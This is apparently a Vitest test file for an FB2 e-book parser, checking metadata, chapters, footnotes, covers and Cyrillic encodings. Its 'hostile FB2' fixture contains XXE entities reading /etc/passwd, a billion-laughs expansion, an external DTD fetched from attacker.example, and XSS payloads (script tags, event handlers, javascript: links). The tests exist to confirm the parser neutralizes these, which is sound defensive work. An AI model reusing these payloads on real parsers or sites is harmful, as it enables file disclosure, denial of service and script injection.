// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { BlockKind } from "./content";
import {
	declaredFb2Encoding,
	decodeFb2Text,
	neutralizeFb2Markup,
	parseFb2,
	parseFb2Markup,
} from "./fb2-parser";

const NS =
	'xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink"';

/** "hello" as a 5-byte payload, base64 — a stand-in for image bytes. */
const COVER_BASE64 = "aGVsbG8=";

const BOOK = `<?xml version="1.0" encoding="utf-8"?>
<FictionBook ${NS}>
 <description>
  <title-info>
   <genre>sf_horror</genre>
   <author><first-name>Стивен</first-name><last-name>Кинг</last-name></author>
   <author><nickname>translator42</nickname></author>
   <book-title>Библиотечная полиция</book-title>
   <coverpage><image l:href="#cover.jpg"/></coverpage>
  </title-info>
 </description>
 <body>
  <title><p>Библиотечная</p><p>полиция</p></title>
  <epigraph><p>Эпиграф книги.</p><text-author>Автор эпиграфа</text-author></epigraph>
  <section>
   <title><p>Часть первая</p></title>
   <section>
    <title><p>Глава 1</p></title>
    <p>Первый <emphasis>абзац</emphasis> со <strong>сноской</strong><a l:href="#n1" type="note">[1]</a>.</p>
    <empty-line/>
    <subtitle>* * *</subtitle>
    <p>Второй абзац.</p>
    <image l:href="#pic.png"/>
   </section>
   <section>
    <title><p>Глава 2</p></title>
    <poem><stanza><v>Строка раз,</v><v>строка два.</v></stanza><text-author>Поэт</text-author></poem>
    <cite><p>Цитата.</p></cite>
    <table><tr><th>A</th><th>B</th></tr><tr><td>1</td><td>2</td></tr></table>
   </section>
  </section>
 </body>
 <body name="notes">
  <title><p>Примечания</p></title>
  <section id="n1"><title><p>1</p></title><p>Текст сноски.</p></section>
  <section id="n2"><title><p>2</p></title><p>Вторая сноска.</p></section>
 </body>
 <binary id="cover.jpg" content-type="image/jpeg">
  ${COVER_BASE64}
 </binary>
</FictionBook>`;

describe("parseFb2Markup", () => {
	const { content, cover } = parseFb2Markup(BOOK);

	it("reads the title and joins every author", () => {
		expect(content.title).toBe("Библиотечная полиция");
		expect(content.author).toBe("Стивен Кинг, translator42");
	});

	it("maps sections to chapters, folding a title-only part into its first chapter", () => {
		expect(content.spine.map((s) => s.title)).toEqual([
			"Библиотечная полиция",
			"Часть первая",
			"Глава 2",
			"Примечания",
		]);
		expect(content.spine[1]?.blocks).toEqual([
			{ kind: BlockKind.Heading, text: "Часть первая" },
			{ kind: BlockKind.Heading, text: "Глава 1" },
			{ kind: BlockKind.Paragraph, text: "Первый абзац со сноской[1]." },
			{ kind: BlockKind.Heading, text: "* * *" },
			{ kind: BlockKind.Paragraph, text: "Второй абзац." },
		]);
	});

	it("keeps the body's own title and epigraph as the opening chapter", () => {
		expect(content.spine[0]?.blocks.map((b) => b.text)).toEqual([
			"Библиотечная полиция",
			"Эпиграф книги.",
			"Автор эпиграфа",
		]);
	});

	it("reads poems, citations and tables as paragraphs", () => {
		expect(content.spine[2]?.blocks.map((b) => b.text)).toEqual([
			"Глава 2",
			"Строка раз,",
			"строка два.",
			"Поэт",
			"Цитата.",
			"A | B",
			"1 | 2",
		]);
	});

	it("collapses the notes body into ONE chapter, each note led by its number", () => {
		expect(content.spine[3]?.blocks).toEqual([
			{ kind: BlockKind.Heading, text: "Примечания" },
			{ kind: BlockKind.Paragraph, text: "1 Текст сноски." },
			{ kind: BlockKind.Paragraph, text: "2 Вторая сноска." },
		]);
	});

	it("extracts the cover the description points at", () => {
		expect(cover?.fileName).toBe("cover.jpg");
		expect(new TextDecoder().decode(cover?.bytes)).toBe("hello");
	});

	it("is deterministic, so a stored reading position stays valid", () => {
		expect(parseFb2Markup(BOOK).content).toEqual(content);
	});
});

describe("parseFb2Markup — odd but real shapes", () => {
	it("reads a book with no namespace, no description and no sections", () => {
		const { content, cover } = parseFb2Markup(
			"<FictionBook><body><p>Один абзац.</p><p>Другой.</p></body></FictionBook>",
		);
		expect(content.title).toBe("Untitled");
		expect(content.author).toBe("");
		expect(content.spine).toHaveLength(1);
		expect(content.spine[0]?.blocks.map((b) => b.text)).toEqual(["Один абзац.", "Другой."]);
		expect(cover).toBeNull();
	});

	it("repairs a bare ampersand and an undeclared entity instead of failing", () => {
		const { content } = parseFb2Markup(
			"<FictionBook><body><section><p>Tom & Jerry&nbsp;— &lt;ok&gt; &#169;</p></section></body></FictionBook>",
		);
		expect(content.spine[0]?.blocks[0]?.text).toBe("Tom & Jerry&nbsp;— <ok> ©");
	});

	it("ignores a cover that is not a raster image or has no payload", () => {
		const withCover = (binary: string): string =>
			`<FictionBook ${NS}><description><title-info><coverpage><image l:href="#c"/></coverpage></title-info></description><body><p>x</p></body>${binary}</FictionBook>`;
		expect(
			parseFb2Markup(withCover('<binary id="c" content-type="image/svg+xml">PHN2Zy8+</binary>')).cover,
		).toBeNull();
		expect(
			parseFb2Markup(withCover('<binary id="c" content-type="image/png">!!not base64!!</binary>'))
				.cover,
		).toBeNull();
		expect(parseFb2Markup(withCover("")).cover).toBeNull();
	});

	it("throws for a document that is not a FictionBook", () => {
		expect(() => parseFb2Markup("<html><body><p>x</p></body></html>")).toThrow(/FictionBook/);
		expect(() => parseFb2Markup("not xml at all")).toThrow();
	});
});

describe("hostile FB2", () => {
	const HOSTILE = `<?xml version="1.0"?>
<!DOCTYPE FictionBook [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY % remote SYSTEM "http://attacker.example/evil.dtd">
 %remote;
]>
<FictionBook ${NS}>
 <description><title-info><book-title>&xxe;</book-title></title-info></description>
 <body>
  <section>
   <title><p>Глава</p></title>
   <p onclick="steal()">Текст &xxe; и &lol2; здесь.<script>alert(1)</script><img src="x" onerror="alert(2)"/></p>
   <script>alert(3)</script>
   <iframe src="https://attacker.example"/>
   <p><a l:href="javascript:alert(4)">ссылка</a></p>
  </section>
 </body>
</FictionBook>`;

	it("removes the DOCTYPE and escapes every non-builtin entity reference", () => {
		const safe = neutralizeFb2Markup(HOSTILE);
		expect(safe).not.toMatch(/<!DOCTYPE/i);
		expect(safe).not.toMatch(/<!ENTITY/i);
		expect(safe).not.toContain("file:///etc/passwd");
		expect(safe).toContain("&amp;xxe;");
		expect(safe).toContain("&amp;lol2;");
	});

	it("never expands an entity: the references survive only as literal text", () => {
		const { content } = parseFb2Markup(HOSTILE);
		expect(content.title).toBe("&xxe;");
		const text = content.spine.flatMap((s) => s.blocks.map((b) => b.text)).join("\n");
		expect(text).toContain("Текст &xxe; и &lol2; здесь.");
		expect(text).not.toContain("lollol");
		expect(text).not.toContain("root:");
	});

	it("drops script, iframe and image content — text included — and all attributes", () => {
		const { content } = parseFb2Markup(HOSTILE);
		const serialized = JSON.stringify(content);
		expect(serialized).not.toContain("alert");
		expect(serialized).not.toContain("steal");
		expect(serialized).not.toContain("javascript:");
		expect(serialized).not.toContain("attacker.example");
		expect(content.spine[0]?.blocks.map((b) => b.text)).toEqual([
			"Глава",
			"Текст &xxe; и &lol2; здесь.",
			"ссылка",
		]);
	});

	it("still neutralises a DOCTYPE written to dodge the strip", () => {
		const tricky = `<!DOCTYPE FictionBook [<!ENTITY a "]>"><!ENTITY b "boom">]><FictionBook><body><p>&b;</p></body></FictionBook>`;
		expect(neutralizeFb2Markup(tricky)).toContain("&amp;b;");
		// Whatever survives of the declaration, the reference is never expanded.
		let text = "";
		try {
			text = JSON.stringify(parseFb2Markup(tricky).content);
		} catch {
			text = "";
		}
		expect(text).not.toContain("boom");
	});
});

describe("FB2 text encoding", () => {
	/** Encode a string as windows-1251 (ASCII + the А–я block + Ё/ё). */
	function cp1251(text: string): Uint8Array {
		const out = new Uint8Array(text.length);
		for (let i = 0; i < text.length; i += 1) {
			const code = text.charCodeAt(i);
			if (code < 0x80) out[i] = code;
			else if (code >= 0x0410 && code <= 0x044f) out[i] = code - 0x0410 + 0xc0;
			else if (code === 0x0401) out[i] = 0xa8;
			else if (code === 0x0451) out[i] = 0xb8;
			else if (code === 0x2014) out[i] = 0x97;
			else if (code === 0x00ab) out[i] = 0xab;
			else if (code === 0x00bb) out[i] = 0xbb;
			else throw new Error(`fixture char not mapped: ${text[i]}`);
		}
		return out;
	}

	const RUSSIAN =
		'<?xml version="1.0" encoding="windows-1251"?><FictionBook><description><title-info><author><first-name>Стивен</first-name><last-name>Кинг</last-name></author><book-title>Ёжик — «в тумане»</book-title></title-info></description><body><section><title><p>Глава первая</p></title><p>Съешь ещё этих мягких булок.</p></section></body></FictionBook>';

	it("reads the declared encoding, a BOM winning over the declaration", () => {
		expect(declaredFb2Encoding(cp1251(RUSSIAN))).toBe("windows-1251");
		expect(declaredFb2Encoding(new TextEncoder().encode("<FictionBook/>"))).toBe("utf-8");
		expect(declaredFb2Encoding(new Uint8Array([0xef, 0xbb, 0xbf, 0x3c]))).toBe("utf-8");
		expect(declaredFb2Encoding(new Uint8Array([0xff, 0xfe, 0x3c, 0x00]))).toBe("utf-16le");
	});

	it("decodes a windows-1251 book", () => {
		const { content } = parseFb2(cp1251(RUSSIAN));
		expect(content.title).toBe("Ёжик — «в тумане»");
		expect(content.author).toBe("Стивен Кинг");
		expect(content.spine[0]?.title).toBe("Глава первая");
		expect(content.spine[0]?.blocks[1]?.text).toBe("Съешь ещё этих мягких булок.");
	});

	it("decodes UTF-8 with a byte-order mark", () => {
		const bytes = new TextEncoder().encode("﻿<FictionBook><body><p>Привет</p></body></FictionBook>");
		expect(parseFb2(bytes).content.spine[0]?.blocks[0]?.text).toBe("Привет");
	});

	it("falls back to UTF-8 for an encoding label nothing knows", () => {
		const bytes = new TextEncoder().encode(
			'<?xml version="1.0" encoding="x-made-up"?><FictionBook><body><p>Привет</p></body></FictionBook>',
		);
		expect(decodeFb2Text(bytes)).toContain("Привет");
	});
});
